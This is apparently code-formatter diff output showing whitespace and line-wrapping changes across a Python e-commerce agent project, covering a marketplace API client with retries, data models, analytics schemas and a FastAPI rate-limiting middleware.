-    async def _prepare_headers(self, headers: Optional[Dict[str, str]] = None) -> Dict[str, str]:
+    async def _prepare_headers(
+        self, headers: Optional[Dict[str, str]] = None
+    ) -> Dict[str, str]:
         """
         Prepare headers for API requests.
-        
+
         Args:
             headers: Optional additional headers
-            
+
         Returns:
             Complete headers dictionary
         """
         request_headers = self.default_headers.copy()
         if headers:
@@ -78,29 +80,33 @@
         headers: Optional[Dict] = None,
         max_retries: int = 3,
     ) -> Dict[str, Any]:
         """
         Send GET request with marketplace-specific retry logic.
-        
+
         Args:
             endpoint: API endpoint
             params: Query parameters
             headers: Request headers
             max_retries: Maximum number of retries
-            
+
         Returns:
             Response data
         """
         request_headers = await self._prepare_headers(headers)
-        
+
         for attempt in range(max_retries + 1):
             try:
-                response = await self.get(endpoint, params=params, headers=request_headers)
+                response = await self.get(
+                    endpoint, params=params, headers=request_headers
+                )
                 return response
             except Exception as e:
                 if attempt == max_retries:
-                    logger.error(f"Failed to GET {endpoint} after {max_retries} retries: {e}")
+                    logger.error(
+                        f"Failed to GET {endpoint} after {max_retries} retries: {e}"
+                    )
                     raise
                 logger.warning(f"GET {endpoint} attempt {attempt + 1} failed: {e}")
                 await self._handle_retry_delay(attempt)
 
     async def post_with_retry(
@@ -111,30 +117,34 @@
         headers: Optional[Dict] = None,
         max_retries: int = 3,
     ) -> Dict[str, Any]:
         """
         Send POST request with marketplace-specific retry logic.
-        
+
         Args:
             endpoint: API endpoint
             json: JSON payload
             data: Form data
             headers: Request headers
             max_retries: Maximum number of retries
-            
+
         Returns:
             Response data
         """
         request_headers = await self._prepare_headers(headers)
-        
+
         for attempt in range(max_retries + 1):
             try:
-                response = await self.post(endpoint, json=json, data=data, headers=request_headers)
+                response = await self.post(
+                    endpoint, json=json, data=data, headers=request_headers
+                )
                 return response
             except Exception as e:
                 if attempt == max_retries:
-                    logger.error(f"Failed to POST {endpoint} after {max_retries} retries: {e}")
+                    logger.error(
+                        f"Failed to POST {endpoint} after {max_retries} retries: {e}"
+                    )
                     raise
                 logger.warning(f"POST {endpoint} attempt {attempt + 1} failed: {e}")
                 await self._handle_retry_delay(attempt)
 
     async def put_with_retry(
@@ -144,48 +154,51 @@
         headers: Optional[Dict] = None,
         max_retries: int = 3,
     ) -> Dict[str, Any]:
         """
         Send PUT request with marketplace-specific retry logic.
-        
+
         Args:
             endpoint: API endpoint
             json: JSON payload
             headers: Request headers
             max_retries: Maximum number of retries
-            
+
         Returns:
             Response data
         """
         request_headers = await self._prepare_headers(headers)
-        
+
         for attempt in range(max_retries + 1):
             try:
                 response = await self.put(endpoint, json=json, headers=request_headers)
                 return response
             except Exception as e:
                 if attempt == max_retries:
-                    logger.error(f"Failed to PUT {endpoint} after {max_retries} retries: {e}")
+                    logger.error(
+                        f"Failed to PUT {endpoint} after {max_retries} retries: {e}"
+                    )
                     raise
                 logger.warning(f"PUT {endpoint} attempt {attempt + 1} failed: {e}")
                 await self._handle_retry_delay(attempt)
 
     async def _handle_retry_delay(self, attempt: int) -> None:
         """
         Handle delay between retry attempts.
-        
+
         Args:
             attempt: Current attempt number (0-based)
         """
         import asyncio
-        delay = min(2 ** attempt, 10)  # Exponential backoff with max 10 seconds
+
+        delay = min(2**attempt, 10)  # Exponential backoff with max 10 seconds
         await asyncio.sleep(delay)
 
     def get_marketplace_info(self) -> Dict[str, Any]:
         """
         Get information about the marketplace.
-        
+
         Returns:
             Marketplace information dictionary
         """
         return {
             "marketplace": self.marketplace,
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/marketplace_client.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/account.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/account.py	2025-06-19 04:03:52.831165+00:00
@@ -11,10 +11,11 @@
 
 
 @dataclass
 class Account:
     """Account model."""
+
     id: str
     name: str
     type: AccountType = AccountType.BASIC
     status: AccountStatus = AccountStatus.ACTIVE
     created_at: Optional[datetime] = None
@@ -23,10 +24,11 @@
 
 
 @dataclass
 class UserAccount:
     """User account relationship model."""
+
     user_id: str
     account_id: str
     role: UserRole = UserRole.USER
     created_at: Optional[datetime] = None
     permissions: Optional[Dict[str, Any]] = None
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/account.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/repository.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/repository.py	2025-06-19 04:03:53.085128+00:00
@@ -17,11 +17,10 @@
 )
 from fs_agt_clean.services.infrastructure.monitoring.metrics_models import MetricUpdate
 from qdrant_client import QdrantClient
 
 logger = logging.getLogger(__name__)
-
 
 
 class KnowledgeRepository:
     """Repository for shared knowledge between agents."""
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/chat.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/chat.py	2025-06-19 04:03:53.173440+00:00
@@ -14,148 +14,155 @@
 
 
 @dataclass
 class MessageEntity:
     """Represents an entity extracted from a message."""
+
     entity_type: str
     value: str
     confidence: float = 0.0
     start_pos: Optional[int] = None
     end_pos: Optional[int] = None
     metadata: Dict[str, Any] = field(default_factory=dict)
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "entity_type": self.entity_type,
             "value": self.value,
             "confidence": self.confidence,
             "start_pos": self.start_pos,
             "end_pos": self.end_pos,
-            "metadata": self.metadata
+            "metadata": self.metadata,
         }
 
 
 @dataclass
 class MessageIntent:
     """Represents the intent of a user message."""
+
     intent_type: str
     confidence: float = 0.0
     entities: List[MessageEntity] = field(default_factory=list)
     reasoning: Optional[str] = None
     metadata: Dict[str, Any] = field(default_factory=dict)
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "intent_type": self.intent_type,
             "confidence": self.confidence,
             "entities": [entity.to_dict() for entity in self.entities],
             "reasoning": self.reasoning,
-            "metadata": self.metadata
+            "metadata": self.metadata,
         }
 
 
 @dataclass
 class ChatMessage:
     """Represents a chat message."""
+
     user_id: str
     text: str
     message_id: Optional[str] = None
     conversation_id: Optional[str] = None
     timestamp: Optional[datetime] = None
     message_type: str = "user"  # user, agent, system
     intent: Optional[MessageIntent] = None
     metadata: Dict[str, Any] = field(default_factory=dict)
-    
+
     def __post_init__(self):
         """Initialize default values after creation."""
         if self.timestamp is None:
             self.timestamp = datetime.now()
         if self.message_id is None:
             self.message_id = f"msg_{self.timestamp.strftime('%Y%m%d_%H%M%S_%f')}"
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "message_id": self.message_id,
             "user_id": self.user_id,
             "conversation_id": self.conversation_id,
             "text": self.text,
             "message_type": self.message_type,
             "timestamp": self.timestamp.isoformat() if self.timestamp else None,
             "intent": self.intent.to_dict() if self.intent else None,
-            "metadata": self.metadata
+            "metadata": self.metadata,
         }
 
 
 @dataclass
 class AgentResponse:
     """Represents a response from an agent."""
+
     text: str
     agent_type: Optional[str] = None
     confidence: float = 1.0
     response_id: Optional[str] = None
     timestamp: Optional[datetime] = None
     metadata: Dict[str, Any] = field(default_factory=dict)
     recommendations: List[Dict[str, Any]] = field(default_factory=list)
     actions: List[Dict[str, Any]] = field(default_factory=list)
-    
+
     def __post_init__(self):
         """Initialize default values after creation."""
         if self.timestamp is None:
             self.timestamp = datetime.now()
         if self.response_id is None:
             self.response_id = f"resp_{self.timestamp.strftime('%Y%m%d_%H%M%S_%f')}"
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "response_id": self.response_id,
             "text": self.text,
             "agent_type": self.agent_type,
             "confidence": self.confidence,
             "timestamp": self.timestamp.isoformat() if self.timestamp else None,
             "metadata": self.metadata,
             "recommendations": self.recommendations,
-            "actions": self.actions
+            "actions": self.actions,
         }
 
 
 @dataclass
 class ConversationContext:
     """Represents the context of a conversation."""
+
     conversation_id: str
     user_id: str
     current_agent: Optional[str] = None
     session_data: Dict[str, Any] = field(default_factory=dict)
     conversation_history: List[ChatMessage] = field(default_factory=list)
     created_at: Optional[datetime] = None
     updated_at: Optional[datetime] = None
-    
+
     def __post_init__(self):
         """Initialize default values after creation."""
         if self.created_at is None:
             self.created_at = datetime.now()
         if self.updated_at is None:
             self.updated_at = datetime.now()
-    
+
     def add_message(self, message: ChatMessage) -> None:
         """Add a message to the conversation history."""
         self.conversation_history.append(message)
         self.updated_at = datetime.now()
-    
+
     def get_recent_messages(self, limit: int = 10) -> List[ChatMessage]:
         """Get recent messages from the conversation."""
         return self.conversation_history[-limit:] if self.conversation_history else []
-    
+
     def to_dict(self) -> Dict[str, Any]:
         """Convert to dictionary representation."""
         return {
             "conversation_id": self.conversation_id,
             "user_id": self.user_id,
             "current_agent": self.current_agent,
             "session_data": self.session_data,
-            "conversation_history": [msg.to_dict() for msg in self.conversation_history],
+            "conversation_history": [
+                msg.to_dict() for msg in self.conversation_history
+            ],
             "created_at": self.created_at.isoformat() if self.created_at else None,
-            "updated_at": self.updated_at.isoformat() if self.updated_at else None
+            "updated_at": self.updated_at.isoformat() if self.updated_at else None,
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/chat.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/middleware/rate_limiter.py	2025-06-16 02:37:27.132421+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/middleware/rate_limiter.py	2025-06-19 04:03:53.225278+00:00
@@ -11,10 +11,11 @@
 import asyncio
 import logging
 
 logger = logging.getLogger(__name__)
 
+
 class RateLimiter:
     """Token bucket rate limiter implementation."""
 
     def __init__(self, max_requests: int = 100, window_seconds: int = 60):
         self.max_requests = max_requests
@@ -46,29 +47,34 @@
         if not request_times:
             return int(time.time())
 
         return int(request_times[0] + self.window_seconds)
 
+
 class RateLimitMiddleware(BaseHTTPMiddleware):
     """Rate limiting middleware for FastAPI."""
 
     def __init__(self, app, calls_per_minute: int = 100, burst_limit: int = 20):
         super().__init__(app)
 
         # Different rate limits for different types of requests
         self.general_limiter = RateLimiter(calls_per_minute, 60)  # General API calls
-        self.burst_limiter = RateLimiter(burst_limit, 10)  # Burst protection (10 seconds)
-        self.auth_limiter = RateLimiter(500, 60)  # Authentication endpoints - support 100+ concurrent users
+        self.burst_limiter = RateLimiter(
+            burst_limit, 10
+        )  # Burst protection (10 seconds)
+        self.auth_limiter = RateLimiter(
+            500, 60
+        )  # Authentication endpoints - support 100+ concurrent users
         self.upload_limiter = RateLimiter(5, 60)  # File upload endpoints
 
         # Exempt paths from rate limiting
         self.exempt_paths = {
             "/health",
             "/metrics",
             "/docs",
             "/openapi.json",
-            "/favicon.ico"
+            "/favicon.ico",
         }
 
     def get_client_identifier(self, request: Request) -> str:
         """Get client identifier for rate limiting."""
         # Try to get real IP from headers (for reverse proxy setups)
@@ -116,36 +122,41 @@
 
         client_id = self.get_client_identifier(request)
 
         # Check burst protection first, but exempt authentication endpoints for concurrent users
         path = request.url.path
-        is_auth_endpoint = any(auth_path in path for auth_path in ["/auth", "/login", "/token"])
+        is_auth_endpoint = any(
+            auth_path in path for auth_path in ["/auth", "/login", "/token"]
+        )
 
         # For auth endpoints, use a more lenient burst check to allow concurrent authentication
         if not is_auth_endpoint and not await self.burst_limiter.is_allowed(client_id):
             logger.warning(f"Burst rate limit exceeded for client: {client_id}")
             return self._create_rate_limit_response(
                 "Too many requests in short time",
-                self.burst_limiter.get_reset_time(client_id)
+                self.burst_limiter.get_reset_time(client_id),
             )
 
         # Check general rate limit
         rate_limiter = self.get_rate_limiter(request)
         if not await rate_limiter.is_allowed(client_id):
-            logger.warning(f"Rate limit exceeded for client: {client_id} on path: {request.url.path}")
+            logger.warning(
+                f"Rate limit exceeded for client: {client_id} on path: {request.url.path}"
+            )
             return self._create_rate_limit_response(
-                "Rate limit exceeded",
-                rate_limiter.get_reset_time(client_id)
+                "Rate limit exceeded", rate_limiter.get_reset_time(client_id)
             )
 
         # Process request
         response = await call_next(request)
 
         # Add rate limit headers
         response.headers["X-RateLimit-Limit"] = str(rate_limiter.max_requests)
         response.headers["X-RateLimit-Window"] = str(rate_limiter.window_seconds)
-        response.headers["X-RateLimit-Reset"] = str(rate_limiter.get_reset_time(client_id))
+        response.headers["X-RateLimit-Reset"] = str(
+            rate_limiter.get_reset_time(client_id)
+        )
 
         return response
 
     def _create_rate_limit_response(self, message: str, reset_time: int) -> Response:
         """Create rate limit exceeded response."""
@@ -153,32 +164,36 @@
             content=f'{{"error": "{message}", "reset_time": {reset_time}}}',
             status_code=429,
             headers={
                 "Content-Type": "application/json",
                 "Retry-After": str(max(1, reset_time - int(time.time()))),
-                "X-RateLimit-Reset": str(reset_time)
-            }
+                "X-RateLimit-Reset": str(reset_time),
+            },
         )
+
 
 # Production rate limiting configuration
 def create_production_rate_limiter() -> RateLimitMiddleware:
     """Create production-ready rate limiter with enhanced security."""
     return RateLimitMiddleware(
         app=None,  # Will be set by FastAPI
         calls_per_minute=1000,  # 1000 calls per minute for production
-        burst_limit=50  # 50 calls in 10 seconds burst protection
+        burst_limit=50,  # 50 calls in 10 seconds burst protection
     )
+
 
 # Enhanced production rate limiter with IP blocking
 class ProductionRateLimiter(RateLimitMiddleware):
     """Production-grade rate limiter with advanced features."""
 
     def __init__(self, app, calls_per_minute: int = 1000, burst_limit: int = 50):
         super().__init__(app, calls_per_minute, burst_limit)
 
         # Enhanced rate limits for production
-        self.auth_limiter = RateLimiter(500, 60)  # Production auth limits - support 100+ concurrent users
+        self.auth_limiter = RateLimiter(
+            500, 60
+        )  # Production auth limits - support 100+ concurrent users
         self.api_limiter = RateLimiter(calls_per_minute, 60)
         self.upload_limiter = RateLimiter(3, 60)  # Very strict upload limits
 
         # IP blocking for repeated violations
         self.blocked_ips = {}
@@ -209,11 +224,11 @@
         # Check if IP is blocked
         if self.is_ip_blocked(client_ip):
             return Response(
                 content='{"error": "IP address blocked due to rate limit violations"}',
                 status_code=429,
-                headers={"Content-Type": "application/json"}
+                headers={"Content-Type": "application/json"},
             )
 
         # Call parent dispatch
         response = await super().dispatch(request, call_next)
 
@@ -222,14 +237,15 @@
             self.violation_counts[client_ip] += 1
             if self.violation_counts[client_ip] >= 5:  # 5 violations = block
                 self.block_ip(client_ip)
 
         return response
+
 
 # Development rate limiting configuration
 def create_development_rate_limiter() -> RateLimitMiddleware:
     """Create development-friendly rate limiter."""
     return RateLimitMiddleware(
         app=None,  # Will be set by FastAPI
         calls_per_minute=10000,  # Higher limit for development
-        burst_limit=100  # Higher burst limit for development
+        burst_limit=100,  # Higher burst limit for development
     )
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/middleware/rate_limiter.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/listing.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/listing.py	2025-06-19 04:03:53.257462+00:00
@@ -9,20 +9,22 @@
 from pydantic import BaseModel
 
 
 class ListingStatus(str, Enum):
     """Enumeration of listing statuses."""
+
     ACTIVE = "active"
     INACTIVE = "inactive"
     PENDING = "pending"
     SOLD = "sold"
     ENDED = "ended"
     DRAFT = "draft"
 
 
 class Listing(BaseModel):
     """Base listing model."""
+
     id: Optional[str] = None
     title: str
     description: str
     price: float
     currency: str = "USD"
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/listing.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/database/marketplaces.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/database/marketplaces.py	2025-06-19 04:03:53.291556+00:00
@@ -2,11 +2,20 @@
 
 import uuid
 from datetime import datetime, timezone
 from typing import Any, Dict, List, Optional
 
-from sqlalchemy import Column, DateTime, String, Text, Boolean, Integer, Float, ForeignKey
+from sqlalchemy import (
+    Column,
+    DateTime,
+    String,
+    Text,
+    Boolean,
+    Integer,
+    Float,
+    ForeignKey,
+)
 from sqlalchemy.dialects.postgresql import JSONB, UUID
 from sqlalchemy.orm import relationship
 
 from fs_agt_clean.core.models.database.base import Base
 
@@ -20,11 +29,13 @@
     name = Column(String(255), nullable=False)
     description = Column(Text)
     type = Column(String(50), nullable=False)
     status = Column(String(50), nullable=False, default="active")
     config = Column(JSONB, nullable=False, default={})
-    created_at = Column(DateTime, nullable=False, default=lambda: datetime.now(timezone.utc))
+    created_at = Column(
+        DateTime, nullable=False, default=lambda: datetime.now(timezone.utc)
+    )
     updated_at = Column(
         DateTime, nullable=False, default=lambda: datetime.now(timezone.utc)
     )
 
     def __init__(
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/database/marketplaces.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/marketplace.py	2025-06-14 20:35:30.795751+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/marketplace.py	2025-06-19 04:03:53.349127+00:00
@@ -6,35 +6,48 @@
 from pydantic import BaseModel, Field
 
 
 class MarketplaceBase(BaseModel):
     """Base model for marketplace operations."""
+
     name: str = Field(description="Name of the marketplace")
-    description: Optional[str] = Field(None, description="Description of the marketplace")
+    description: Optional[str] = Field(
+        None, description="Description of the marketplace"
+    )
     type: str = Field(description="Type of the marketplace")
     status: Optional[str] = Field("active", description="Status of the marketplace")
-    config: Optional[Dict[str, Any]] = Field({}, description="Configuration of the marketplace")
+    config: Optional[Dict[str, Any]] = Field(
+        {}, description="Configuration of the marketplace"
+    )
 
 
 class MarketplaceCreate(MarketplaceBase):
     """Model for creating a marketplace."""
+
     pass
 
 
 class MarketplaceUpdate(BaseModel):
     """Model for updating a marketplace."""
+
     name: Optional[str] = Field(None, description="Name of the marketplace")
-    description: Optional[str] = Field(None, description="Description of the marketplace")
+    description: Optional[str] = Field(
+        None, description="Description of the marketplace"
+    )
     type: Optional[str] = Field(None, description="Type of the marketplace")
     status: Optional[str] = Field(None, description="Status of the marketplace")
-    config: Optional[Dict[str, Any]] = Field(None, description="Configuration of the marketplace")
+    config: Optional[Dict[str, Any]] = Field(
+        None, description="Configuration of the marketplace"
+    )
 
 
 class MarketplaceResponse(MarketplaceBase):
     """Model for marketplace response."""
+
     id: str = Field(description="Marketplace ID")
     created_at: datetime = Field(description="Creation timestamp")
     updated_at: datetime = Field(description="Last update timestamp")
 
     class Config:
         """Pydantic configuration."""
+
         orm_mode = True
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/marketplace.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/database/agents.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/database/agents.py	2025-06-19 04:03:53.378827+00:00
@@ -22,10 +22,11 @@
 from .base import Base
 
 
 class AgentType(enum.Enum):
     """Agent type enumeration."""
+
     MARKET_SPECIALIST = "MARKET_SPECIALIST"
     INVENTORY_MANAGER = "INVENTORY_MANAGER"
     PRICING_ANALYST = "PRICING_ANALYST"
     EXECUTIVE = "EXECUTIVE"
     AMAZON_AGENT = "AMAZON_AGENT"
@@ -44,92 +45,98 @@
     IMAGE_AGENT = "IMAGE_AGENT"
 
 
 class AgentStatus(enum.Enum):
     """Agent status enumeration."""
+
     ACTIVE = "ACTIVE"
     INACTIVE = "INACTIVE"
     INITIALIZING = "INITIALIZING"
     ERROR = "ERROR"
     MAINTENANCE = "MAINTENANCE"
 
 
 class AgentPriority(enum.Enum):
     """Agent priority enumeration."""
+
     LOW = "LOW"
     MEDIUM = "MEDIUM"
     HIGH = "HIGH"
     CRITICAL = "CRITICAL"
 
 
 class AgentModel(Base):
     """SQLAlchemy model for agents."""
-    
+
     __tablename__ = "agents"
-    
+
     # Primary key
     id = Column(String(255), primary_key=True, default=lambda: str(uuid.uuid4()))
-    
+
     # Basic agent information
     name = Column(String(255), nullable=False)
     agent_type = Column(Enum(AgentType), nullable=False)
     status = Column(Enum(AgentStatus), nullable=False, default=AgentStatus.INITIALIZING)
     priority = Column(Enum(AgentPriority), nullable=False, default=AgentPriority.MEDIUM)
-    
+
     # Agent configuration
     capabilities = Column(JSON, nullable=True, default=list)
     configuration = Column(JSON, nullable=True, default=dict)
-    authority_level = Column(Enum(AgentPriority), nullable=False, default=AgentPriority.MEDIUM)
-    
+    authority_level = Column(
+        Enum(AgentPriority), nullable=False, default=AgentPriority.MEDIUM
+    )
+
     # Agent state and metrics
     last_activity = Column(DateTime(timezone=True), nullable=True)
     health_status = Column(String(50), nullable=True, default="unknown")
     error_count = Column(Integer, nullable=False, default=0)
     success_count = Column(Integer, nullable=False, default=0)
-    
+
     # Performance metrics
     average_response_time = Column(Float, nullable=True)
     total_tasks_completed = Column(Integer, nullable=False, default=0)
     total_decisions_made = Column(Integer, nullable=False, default=0)
-    
+
     # Agent metadata
     description = Column(Text, nullable=True)
     version = Column(String(50), nullable=True, default="1.0.0")
     tags = Column(JSON, nullable=True, default=list)
-    
+
     # Relationships and dependencies
     parent_agent_id = Column(String(255), nullable=True)
     managed_resources = Column(JSON, nullable=True, default=list)
-    
+
     # Timestamps
     created_at = Column(
-        DateTime(timezone=True),
-        nullable=False,
-        server_default=func.now()
+        DateTime(timezone=True), nullable=False, server_default=func.now()
     )
     updated_at = Column(
         DateTime(timezone=True),
         nullable=False,
         server_default=func.now(),
-        onupdate=func.now()
+        onupdate=func.now(),
     )
-    
+
     def __repr__(self):
         return f"<AgentModel(id='{self.id}', name='{self.name}', type='{self.agent_type}', status='{self.status}')>"
-    
+
     def to_dict(self) -> Dict:
         """Convert agent model to dictionary."""
         return {
             "id": self.id,
             "name": self.name,
             "agent_type": self.agent_type.value if self.agent_type else None,
             "status": self.status.value if self.status else None,
             "priority": self.priority.value if self.priority else None,
             "capabilities": self.capabilities or [],
             "configuration": self.configuration or {},
-            "authority_level": self.authority_level.value if self.authority_level else None,
-            "last_activity": self.last_activity.isoformat() if self.last_activity else None,
+            "authority_level": (
+                self.authority_level.value if self.authority_level else None
+            ),
+            "last_activity": (
+                self.last_activity.isoformat() if self.last_activity else None
+            ),
             "health_status": self.health_status,
             "error_count": self.error_count,
             "success_count": self.success_count,
             "average_response_time": self.average_response_time,
             "total_tasks_completed": self.total_tasks_completed,
@@ -140,16 +147,16 @@
             "parent_agent_id": self.parent_agent_id,
             "managed_resources": self.managed_resources or [],
             "created_at": self.created_at.isoformat() if self.created_at else None,
             "updated_at": self.updated_at.isoformat() if self.updated_at else None,
         }
-    
+
     @classmethod
     def from_dict(cls, data: Dict) -> "AgentModel":
         """Create agent model from dictionary."""
         agent = cls()
-        
+
         # Set basic fields
         if "id" in data:
             agent.id = data["id"]
         if "name" in data:
             agent.name = data["name"]
@@ -157,19 +164,19 @@
             agent.agent_type = AgentType(data["agent_type"])
         if "status" in data:
             agent.status = AgentStatus(data["status"])
         if "priority" in data:
             agent.priority = AgentPriority(data["priority"])
-        
+
         # Set configuration fields
         if "capabilities" in data:
             agent.capabilities = data["capabilities"]
         if "configuration" in data:
             agent.configuration = data["configuration"]
         if "authority_level" in data:
             agent.authority_level = AgentPriority(data["authority_level"])
-        
+
         # Set metadata fields
         if "description" in data:
             agent.description = data["description"]
         if "version" in data:
             agent.version = data["version"]
@@ -177,33 +184,35 @@
             agent.tags = data["tags"]
         if "parent_agent_id" in data:
             agent.parent_agent_id = data["parent_agent_id"]
         if "managed_resources" in data:
             agent.managed_resources = data["managed_resources"]
-        
+
         return agent
-    
-    def update_metrics(self, response_time: Optional[float] = None, success: bool = True):
+
+    def update_metrics(
+        self, response_time: Optional[float] = None, success: bool = True
+    ):
         """Update agent performance metrics."""
         if success:
             self.success_count += 1
         else:
             self.error_count += 1
-        
+
         if response_time is not None:
             if self.average_response_time is None:
                 self.average_response_time = response_time
             else:
                 # Calculate rolling average
                 total_calls = self.success_count + self.error_count
                 self.average_response_time = (
-                    (self.average_response_time * (total_calls - 1) + response_time) / total_calls
-                )
-        
+                    self.average_response_time * (total_calls - 1) + response_time
+                ) / total_calls
+
         self.last_activity = datetime.now(timezone.utc)
         self.updated_at = datetime.now(timezone.utc)
-    
+
     def update_status(self, status: AgentStatus, health_status: Optional[str] = None):
         """Update agent status and health."""
         self.status = status
         if health_status:
             self.health_status = health_status
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/models/database/agents.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/models/analytics.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/models/analytics.py	2025-06-19 04:03:53.385519+00:00
@@ -10,85 +10,117 @@
 from pydantic import BaseModel, Field
 
 
 class TimePeriod(BaseModel):
     """Time period for analytics queries."""
+
     start_date: datetime = Field(..., description="Start date for the time period")
     end_date: datetime = Field(..., description="End date for the time period")
 
 
 class AnalyticsFilters(BaseModel):
     """Filters for analytics queries."""
-    marketplace_ids: Optional[List[str]] = Field(None, description="List of marketplace IDs to filter by")
-    category_ids: Optional[List[str]] = Field(None, description="List of category IDs to filter by")
-    product_ids: Optional[List[str]] = Field(None, description="List of product IDs to filter by")
+
+    marketplace_ids: Optional[List[str]] = Field(
+        None, description="List of marketplace IDs to filter by"
+    )
+    category_ids: Optional[List[str]] = Field(
+        None, description="List of category IDs to filter by"
+    )
+    product_ids: Optional[List[str]] = Field(
+        None, description="List of product IDs to filter by"
+    )
 
 
 class PerformanceMetricsRequest(BaseModel):
     """Request model for performance metrics."""
+
     time_period: TimePeriod = Field(..., description="Time period for the metrics")
-    filters: Optional[AnalyticsFilters] = Field(None, description="Optional filters to apply")
+    filters: Optional[AnalyticsFilters] = Field(
+        None, description="Optional filters to apply"
+    )
 
 
 class TopPerformingProduct(BaseModel):
     """Model for top performing product data."""
+
     product_id: str = Field(..., description="Product ID")
     title: str = Field(..., description="Product title")
     views: int = Field(..., description="Number of views")
     conversion_rate: float = Field(..., description="Conversion rate as percentage")
     sales: int = Field(..., description="Number of sales")
     revenue: float = Field(..., description="Total revenue")
 
 
 class PerformanceMetricsResponse(BaseModel):
     """Response model for performance metrics."""
+
     request_id: str = Field(..., description="Unique request ID")
     time_period: TimePeriod = Field(..., description="Time period for the metrics")
     metrics: Dict[str, Any] = Field(..., description="Performance metrics data")
-    top_performing_products: List[TopPerformingProduct] = Field(..., description="Top performing products")
+    top_performing_products: List[TopPerformingProduct] = Field(
+        ..., description="Top performing products"
+    )
     created_at: datetime = Field(..., description="Response creation timestamp")
 
 
 class SalesReportRequest(BaseModel):
     """Request model for sales report."""
+
     time_period: TimePeriod = Field(..., description="Time period for the report")
-    filters: Optional[AnalyticsFilters] = Field(None, description="Optional filters to apply")
+    filters: Optional[AnalyticsFilters] = Field(
+        None, description="Optional filters to apply"
+    )
 
 
 class SalesReportResponse(BaseModel):
     """Response model for sales report."""
+
     report_id: str = Field(..., description="Unique report ID")
     time_period: TimePeriod = Field(..., description="Time period for the report")
     filters: Optional[AnalyticsFilters] = Field(None, description="Applied filters")
     summary: Dict[str, Any] = Field(..., description="Sales summary data")
-    sales_by_marketplace: Dict[str, Any] = Field(..., description="Sales breakdown by marketplace")
-    sales_by_category: Dict[str, Any] = Field(..., description="Sales breakdown by category")
+    sales_by_marketplace: Dict[str, Any] = Field(
+        ..., description="Sales breakdown by marketplace"
+    )
+    sales_by_category: Dict[str, Any] = Field(
+        ..., description="Sales breakdown by category"
+    )
     top_products: List[Dict[str, Any]] = Field(..., description="Top selling products")
     report_url: str = Field(..., description="URL to download the full report")
     created_at: datetime = Field(..., description="Report creation timestamp")
 
 
 class MarketplaceComparisonRequest(BaseModel):
     """Request model for marketplace comparison."""
+
     time_period: TimePeriod = Field(..., description="Time period for the comparison")
     marketplaces: List[str] = Field(..., description="List of marketplaces to compare")
 
 
 class MarketplaceComparisonResponse(BaseModel):
     """Response model for marketplace comparison."""
+
     comparison_id: str = Field(..., description="Unique comparison ID")
     time_period: TimePeriod = Field(..., description="Time period for the comparison")
     marketplaces: List[str] = Field(..., description="Compared marketplaces")
-    overall_comparison: Dict[str, Any] = Field(..., description="Overall comparison data")
-    category_comparison: Dict[str, Any] = Field(..., description="Category-wise comparison")
-    product_comparison: List[Dict[str, Any]] = Field(..., description="Product-wise comparison")
+    overall_comparison: Dict[str, Any] = Field(
+        ..., description="Overall comparison data"
+    )
+    category_comparison: Dict[str, Any] = Field(
+        ..., description="Category-wise comparison"
+    )
+    product_comparison: List[Dict[str, Any]] = Field(
+        ..., description="Product-wise comparison"
+    )
     recommendations: List[str] = Field(..., description="Optimization recommendations")
     created_at: datetime = Field(..., description="Comparison creation timestamp")
 
 
 class DashboardMetrics(BaseModel):
     """Model for dashboard metrics."""
+
     total_sales: int = Field(..., description="Total number of sales")
     total_revenue: float = Field(..., description="Total revenue")
     total_views: int = Field(..., description="Total number of views")
     conversion_rate: float = Field(..., description="Overall conversion rate")
     average_order_value: float = Field(..., description="Average order value")
@@ -97,32 +129,36 @@
     last_updated: str = Field(..., description="Last update timestamp")
 
 
 class AnalyticsDashboardResponse(BaseModel):
     """Response model for analytics dashboard."""
+
     status: str = Field(..., description="Response status")
     analytics: DashboardMetrics = Field(..., description="Dashboard analytics data")
     timestamp: str = Field(..., description="Response timestamp")
 
 
 class MetricPoint(BaseModel):
     """Model for a single metric data point."""
+
     name: str = Field(..., description="Metric name")
     value: float = Field(..., description="Metric value")
     timestamp: datetime = Field(..., description="Metric timestamp")
     labels: Optional[Dict[str, str]] = Field(None, description="Metric labels")
 
 
 class MetricsCollection(BaseModel):
     """Model for a collection of metrics."""
+
     metrics: List[MetricPoint] = Field(..., description="List of metric points")
